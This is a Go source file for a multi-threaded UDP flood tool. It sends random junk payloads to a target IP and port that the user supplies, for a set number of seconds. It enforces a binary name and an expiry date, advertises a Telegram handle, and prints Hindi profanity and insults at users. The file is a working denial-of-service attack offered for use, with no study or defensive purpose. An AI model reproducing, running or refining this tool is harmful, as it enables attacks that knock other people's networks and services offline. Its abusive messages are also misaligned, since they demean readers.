package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Display a bordered message
func displayMessage(message string) {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println(message)
	fmt.Println("╚════════════════════════════════════════╝")
}

// Validate binary name
func validateBinaryName(binaryName string) {
	if !strings.HasSuffix(binaryName, "raja") {
		displayMessage("║           glt naam h chutiye!         ║\n" +
			"║    papa ka naam rakhle 'raja'        ║")
		os.Exit(1)
	}
}

// Check if binary has expired
func checkBinaryExpiry() {
	expiryDate := time.Date(2026, 01, 07, 23, 59, 59, 0, time.UTC)
	if time.Now().After(expiryDate) {
		displayMessage("║           DATE KHATAM LODE!              ║\n" +
			"║    PAPA SE CONTACT KRO:        ║\n" +
			"║    Telegram: @rajaraj_04              ║")
		os.Exit(1)
	}
}

// Validate IP address
func validateIP(ip string) {
	if net.ParseIP(ip) == nil {
		fmt.Printf("Invalid IP address: %s\n", ip)
		os.Exit(1)
	}
}

// Generate random payload
func generatePayload(size int) string {
	hexChars := "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	payload := make([]byte, size*4)
	for i := 0; i < size; i++ {
		payload[i*4] = '\\'
		payload[i*4+1] = 'x'
		payload[i*4+2] = hexChars[rand.Intn(16)]
		payload[i*4+3] = hexChars[rand.Intn(16)]
	}
	return string(payload)
}

// Attack routine
func attack(ip string, port int, duration int) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Printf("Socket creation failed: %v\n", err)
		return
	}
	defer conn.Close()

	payload := generatePayload(512)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			fmt.Printf("Send failed: %v\n", err)
			return
		}
	}
}

func main() {
	validateBinaryName(os.Args[0])
	checkBinaryExpiry()

	if len(os.Args) != 5 {
		displayMessage("Usage: ./raja ip port duration threads")
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port:", os.Args[2])
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid duration:", os.Args[3])
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid thread count:", os.Args[4])
		os.Exit(1)
	}

	validateIP(ip)

	displayMessage("║            @RAJA BHAI  KA SYSTEM              ║\n" +
		"║          COPY PASTER TERI MAA KA BHOSDA          ║")

	fmt.Printf("Attack started by @Rajaraj_04 on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads)

	// Handle interrupt signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\nStopping attack...")
		os.Exit(0)
	}()

	// Display time remaining
	go func() {
		startTime := time.Now()
		for {
			elapsed := int(time.Since(startTime).Seconds())
			remaining := duration - elapsed
			if remaining <= 0 {
				break
			}
			fmt.Printf("\rTime remaining: %d seconds", remaining)
			time.Sleep(1 * time.Second)
		}
		fmt.Println("\rTime remaining: 0 seconds")
	}()

	// Launch threads
	for i := 0; i < threads; i++ {
		go attack(ip, port, duration)
	}

	// Sleep for the duration to keep the main thread alive
	time.Sleep(time.Duration(duration) * time.Second)

	fmt.Println("\nAttack khatam bahen ke lode. Join @RAJARAJ_04")
}
